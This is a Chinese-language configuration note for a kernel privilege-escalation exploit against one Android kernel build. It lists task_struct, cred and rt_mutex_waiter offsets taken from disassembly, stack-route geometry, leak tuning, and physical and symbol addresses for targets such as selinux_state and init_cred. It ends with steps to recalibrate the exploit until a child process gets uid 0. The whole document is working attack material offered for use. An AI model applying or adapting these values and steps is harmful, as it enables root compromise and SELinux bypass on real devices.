# 本机参数与来源

> 目标内核：`5.10.209-android12-9-gef44381c3e04-ab50`（Qualcomm SM8475 / cape，GKI，KMI-9）
> 全部数字来自本机 `boot.img` 的反汇编与内嵌数据，**没有从别的机型直接抄**。
> 换内核后这些值全部失效。

参数文件：`profile/5.10.209-android12-9-gef44381c3e04-ab50.conf`（HOCON），
用 `profile/mkprofile.py` 打成 native 读的 v2 二进制。

---

## 0. 前提：内核里没有 BTF

`CONFIG_DEBUG_INFO_BTF` 未开启，设备上也没有 `/sys/kernel/btf/vmlinux`。
所以上游提取器无法自动读结构体，**所有结构体参数必须手量**，方法就是下面每行的"取证"列。

---

## 1. 镜像基址

| 参数 | 值 | 怎么来的 |
|---|---|---|
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` | 内嵌 kallsyms 的第一个符号 `_head`；交叉验证：代码段里 `0xffffffc008000000` 常量出现 **726** 次 |

上游发布版把这个常量编译成了 `0xffffffc080000000`（6.x 布局），本机必须改，
否则所有 image 域地址整体偏 `0x78000000`，而且它会连带让 `data_alias` 恒为 0（W2 永远 arm 不上）。

---

## 2. `task_struct` 偏移（每行都有反汇编取证）

| 字段 | 值 | 取证（函数 → 指令） |
|---|---|---|
| `comm` | 1936 | `__set_task_comm` → `add x22, x20, #0x790` 后 `strlcpy` |
| `pi_lock` | 2156 | `task_blocks_on_rt_mutex` → `add x24, x2, #0x86c` 后 `casa` |
| `pi_waiters` | 2176 | `rt_mutex_adjust_prio_chain` → `add x1, x23, #0x880` |
| `pi_top_task` | 2192 | `rt_mutex_setprio` → `ldr/str x, [x20, #0x890]` |
| `pi_blocked_on` | 2200 | `task_blocks_on_rt_mutex` → `str x22, [x20, #0x898]` |
| `prio` | 132 | `task_blocks_on_rt_mutex` → `ldr w8, [x20, #0x84]` |
| `normal_prio` | 140 | `rt_mutex_setprio` → `ldr w25, [x20, #0x8c]` |
| `real_cred` | 1912 | `commit_creds` → `ldr x19, [x20, #0x778]` |
| `cred` | 1920 | `commit_creds` → `ldr x8, [x20, #0x780]` |
| `pid` | 1480 | `copy_process` → `str w8, [x20, #0x5c8]` |
| `tgid` | 1484 | `copy_process` → `ldr/str [x…, #0x5cc]` |
| `tasks` | 1224 | `copy_process` → `INIT_LIST_HEAD` 的 `str x9, [x20, #0x4c8]` |
| `seccomp` | 2120 | `__secure_computing` → `ldr w9, [x8, #0x848]` 后 `cmp w9, #2` |
| `sched_task_group` | 784 | `sched_move_task` → `str x8, [x19, #0x310]` |
| `atomic_flags` | 1424 | ⚠️ 唯一没在本机反汇编里复核的字段，取自 KMI-9 冻结布局 |

## 3. `rt_mutex_waiter` 与 `cred`

| 字段 | 值 | 取证 |
|---|---|---|
| `rt_mutex_waiter.task` | 48 | `task_blocks_on_rt_mutex` → `stp x20, x19, [x22, #0x30]` |
| `rt_mutex_waiter.lock` | 56 | 同上（`0x38`），并与 `ldr x8, [x27, #0x38]` 互证 |
| `rt_mutex_waiter.prio` | 64 | `str w8, [x22, #0x40]` |
| `cred.copy_size` | 168 | `prepare_creds` → `mov w2, #0xa8` 传 `memcpy` |
| `cred.usage_offset` | 0 | `commit_creds` / `__put_cred` → `ldar w8, [x0]` |
| `cred.caps_offset` / `caps_count` | 40 / 5 | uid 组（20/24/28/32）之后连续 5×8 字节 |
| `cred.user` / `user_ns` / `group_info` | 128 / 136 / 144 | `prepare_creds` 的 `[x19,#0x80]`、commit 的 `[#0x88]`、`prepare_creds` 的 `[#0x90]` |
| `cred.rcu` | 152 | `put_cred_rcu` → `sub x19, x0, #0x98`（152+16=168 闭合） |

**为什么只有 3 个引用字段**：`CONFIG_USER_NS` 未开 → 没有 `ucounts` 成员，
`user/user_ns/group_info` 三个指针正好填满 128..152。

**为什么 `selinux_enforcing` 偏移是 0**：`CONFIG_SECURITY_SELINUX_DISABLE` 未开（无 `disabled` 成员）、
`_DEVELOP=y`（有 `enforcing`），所以它就是这个结构的第一个字节 —— 直接等于符号 `selinux_state` 的偏移。

## 4. 路由几何

| 路由 | 结论 | 计算 |
|---|---|---|
| `multicast_waiter` | **不可用** | setsockopt 链帧和 896 − greqs 0x20 = 864；futex 链 672 − waiter 0x90 = 528；`waiter_off = 336`，而 `buffer_size = 264`（`ip_setsockopt` 的 `mov w2,#0x108`）→ `336+56+8 > 264`，waiter 在缓冲区外 |
| `select_stack` | **采用** | pselect 链 160+448 = 608，fd_set 栈缓冲 `sp+0x50` → `word0 = −528`；futex waiter `−672+0x90 = −528`；`delta = 0` |
| `tcp_zerocopy` | 未采用 | 路径存在但本代无标定布局 |

**`waiter_shift` 为什么填 `-2` 而不是 0**：应用内部给 waiter word 的编号是"结构体下标 + 2"
（compact 布局把 `tree_pc` 放在 local word 2，而 `tree_entry.__rb_parent_color` 是结构体 word 0）。
实机验证：`shift=0` 时 `out0` 是页面内地址（错），`shift=-2` 时 `out0 = 0xffffff802aa52be8`（正是 W1 目标）。

**`compact_waiter = 1`**：本机 waiter 是 5.10/6.1 的 compact 布局（task 48 / lock 56 / prio 64），
不是 6.6 那种带 tree/pi prio+deadline 的布局。注意应用只从
`route.tcp_zerocopy.compact_waiter` 这一处读该标志，所以 profile 里即使走 select 也要显式写一条。

## 5. KernelSnitch 参数

| 参数 | 值 | 来源 |
|---|---|---|
| `mm_struct_sz` | **960** | `mm_cache_init` → `mov w1, #0x3c0`（`kmem_cache_create_usercopy` 的 size 参数）；填 1024/1280 时泄漏几乎全失败 |
| `collisions` | 4 | 实测对比：填 8 时泄漏几乎全失败，填 4 时约 2/3 成功 |

## 6. 物理地址（决定 W1/W2 能不能写对）

| 参数 | 值 | 来源 |
|---|---|---|
| `kernel_phys_offset`（DRAM 基址） | `0x80000000` | `/proc/zoneinfo` 的 `start_pfn: 524288` × 4096（**不需要 root**） |
| `kernel_phys_load`（`_text` 物理地址） | `0xA8000000` | root 态 `/proc/iomem`：`a8000000-aa48ffff : Kernel code` |

> 本机物理内存还有 `0x800000000–0x8398fffff`、`0x840000000–0xa7fffffff` 两段高位 bank
> （span 约 42 GB），所以 exploit 里出现 `0xffffff88…`（≈36 GB 偏移）的地址是合法的；
> 按"12 GB 内存"造 iomem 反而会让内存泄漏全失败。

## 7. 符号偏移与凭据引用（均来自 kallsyms，相对 `_text`）

| 符号 | 绝对地址 | 相对偏移 |
|---|---|---|
| `init_task` | `0xffffffc00a7abec0` | 41598656 |
| `init_cred` | `0xffffffc00a7c0ae0` | 41683680 |
| `empty_zero_page` | `0xffffffc00a99e000` | 43638784 |
| `root_task_group` | `0xffffffc00a9a3040` | 43659328 |
| `selinux_state` | `0xffffffc00aa52be8` | 44379112 |
| `selinux_blob_sizes` | `0xffffffc00a2f95f8` | 36673016 |
| `security_hook_heads` | `0xffffffc00a2f8f68` | 36671336 |
| `nfulnl_logger` | `0xffffffc00a7a13a0` | 41554848 |
| `loggers` | `0xffffffc00a7a12c8` | 41554648 |
| `sysctl_bootid` | `0xffffffc00aa71c35` | 44506165 |

凭据引用（W2 用，image 域绝对地址）：

- `root_user = 0xffffffc00a7bf660`
- `init_user_ns = 0xffffffc00a7bf6f8`
- `init_groups = 0xffffffc00a7c0b88`

## 8. 交叉验证（为什么这些值可以信）

| 参数组 | 至少两条独立证据 |
|---|---|
| 镜像基址 | kallsyms `_head` + 代码段 726 处常量 |
| 结构体偏移 | 目标函数指令位移 + 另一个函数复现/同代 KMI profile 逐项吻合 + `sizeof` 与 memcpy 长度互证 |
| `mm_struct_sz` | `mm_cache_init` 的 `#0x3c0` + 改成 960 后泄漏立刻稳定 |
| 物理两项 | `/proc/zoneinfo` + `/proc/iomem` + **W1 写成功**（写目标靠它们算） |
| 路由几何 | 帧和+局部偏移计算 + 实机日志里 `in0/in3/out0` 是否等于预期目标 |

## 9. 复现方法（简述）

1. 从固件包取 `boot.img`，按 v4 头解出 kernel；用 `vmlinux-to-elf` 一类工具恢复 kallsyms，
   得到可 `objdump -d` 的 ELF；
2. 从镜像里抠 `IKCFG_ST…IKCFG_ED` 之间的 gzip 得到**完整 .config**（`CONFIG_IKCONFIG=y`）；
3. 对每个结构体字段：找"语义上必然访问它"的函数 → `objdump -d --disassemble-symbols=` → 读位移；
4. 路由几何：各 syscall 链的第一帧大小求和，减去缓冲区/局部变量在栈上的偏移；
5. 物理地址：`/proc/zoneinfo`（DRAM 基址）+ root 态 `/proc/iomem`（Kernel code 起点）；
6. 最后用真机收口：W1 成功 ⇒ 基址+phys+目标偏移全对；`child uid=0` ⇒ cred 模板与
   `init_cred` 别名全对。
